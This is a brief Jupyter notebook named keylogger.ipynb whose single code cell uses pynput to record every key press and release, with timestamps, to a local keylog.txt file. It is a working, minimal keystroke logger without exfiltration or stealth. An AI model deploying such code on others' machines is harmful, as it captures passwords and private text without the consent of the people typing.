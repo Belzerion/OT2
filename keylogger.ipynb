{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "import logging\n",
    "\n",
    "logging.basicConfig(filename=(\"keylog.txt\"), level=logging.DEBUG, format=\"%(asctime)s;%(message)s\")\n",
    "\n",
    "\n",
    " \n",
    "def on_press(key):\n",
    "    logging.info(str(key)+\";press\")\n",
    "def on_release(key):\n",
    "    logging.info(str(key)+\";release\")\n",
    " \n",
    "with Listener(on_press=on_press, on_release=on_release) as listener :\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
